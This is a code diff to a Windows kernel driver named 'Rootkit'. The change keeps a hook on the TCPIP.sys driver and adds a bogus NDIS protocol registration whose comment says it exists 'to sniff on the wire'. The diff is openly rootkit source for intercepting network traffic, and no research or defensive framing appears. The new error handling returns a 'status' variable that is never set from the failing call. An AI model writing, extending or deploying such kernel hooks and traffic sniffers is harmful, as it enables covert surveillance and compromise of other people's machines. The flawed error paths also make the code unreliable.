@@ -1,4 +1,5 @@
 #include "driver.h"
+#include "ndis_sniff.h"
 
 
 DRIVER_INITIALIZE DriverEntry;
@@ -6,6 +7,12 @@ DRIVER_UNLOAD DriverUnload;
 
 UNICODE_STRING  usDeviceName = RTL_CONSTANT_STRING(L"\\Device\\Rootkit");
 UNICODE_STRING  usSymbolicLink = RTL_CONSTANT_STRING(L"\\DosDevices\\Rootkit");
+
+
+//
+//  NDIS Globals:
+//
+NDISPROT_GLOBALS Globals = { 0 };
 
 
 // Driver Entry point
@@ -52,10 +59,18 @@ NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING Regi
 	} 
 	
 	// Hook the TCPIP.sys driver
-	status = TCPHook();
-	//status = InstallTCPDriverHook();
+	if (!NT_SUCCESS(TCPHook())) {
 
-	if (!NT_SUCCESS(status)) {
+		// On failure, delete our device and return
+		IoDeleteDevice(deviceObject);
+		return status;
+	}
+
+	// Register our low-level NDIS Protocol
+	// to sniff on the wire
+	if (!NT_SUCCESS(BogusProtocolRegister())) {
+
+		// On failure, delete our device and return
 		IoDeleteDevice(deviceObject);
 		return status;
 	}
